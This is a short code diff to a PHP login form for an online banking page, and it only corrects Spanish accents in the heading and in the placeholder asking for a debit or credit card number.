@@ -25,10 +25,10 @@ if (isset($_GET["error"])) {
             <!--Cambiar image-->
             <div class="img_trabajador"><img src="img/bcp_bycer.jpg" alt="imagen_login.jpg"></img></div>
             <div class="iniciar_sesion">
-                <h1>Ingresa a tu banca en linea</h1>
+                <h1>Ingresa a tu banca en línea</h1>
                 <form action="../controller/ControllerUserLogin.php" method="POST" autocomplete="off">
                     <div>
-                        <input type="text" placeholder="Numero de tarjeta de debido o credito" name="tarjeta"
+                        <input type="text" placeholder="Número de tarjeta de débito o crédito" name="tarjeta"
                             autocomplete="off">
                     </div>
                     <div class="group">
